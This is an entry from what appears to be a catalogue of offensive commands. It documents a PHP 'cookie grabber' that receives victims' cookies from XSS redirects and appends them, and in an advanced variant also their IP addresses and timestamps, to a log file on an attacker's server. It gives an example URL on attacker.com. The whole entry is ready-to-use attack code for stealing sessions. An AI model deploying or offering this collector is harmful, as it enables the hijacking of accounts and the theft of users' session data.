---
id: eb47da03-de62-42d7-ab4b-956bfb5790ff
name: php-cookie-grabber
type: command
executor: php
data: >-
  <?php $cookie = $_GET['c']; $fp = fopen('cookies.txt', 'a+'); fwrite($fp,
  'Cookie:' .$cookie."\r\n"); fclose($fp); ?>
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:50.151Z'
platforms:
  - Web
tags:
  - php
  - logging
  - exfiltration
verified: false
validated: true
submitted: true
---

# php-cookie-grabber

## Command

```php
<?php $cookie = $_GET['c']; $fp = fopen('cookies.txt', 'a+'); fwrite($fp, 'Cookie:' .$cookie."\r\n"); fclose($fp); ?>
```

## Description

PHP script to receive GET requests from XSS redirects, extract cookies from the 'c' parameter, and append them to a log file for later analysis.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_GET['c'] | Cookie string from query | Yes |
| cookies.txt | Output file for logging | Yes |

## Examples

### Basic Usage

Save as grabber.php and access via http://attacker.com/grabber.php?c=testcookie.

### Advanced Usage

```php
<?php $cookie = $_GET['c']; $ip = $_SERVER['REMOTE_ADDR']; $fp = fopen('cookies.txt', 'a+'); fwrite($fp, date('Y-m-d H:i:s') . ' - IP:' . $ip . ' - Cookie:' . $cookie . "\r\n"); fclose($fp); ?>
```

## Expected Output

Appends lines like 'Cookie: sessionid=abc123' to cookies.txt file on the server.

## Related

- [[commands/xss-cookie-redirect]]
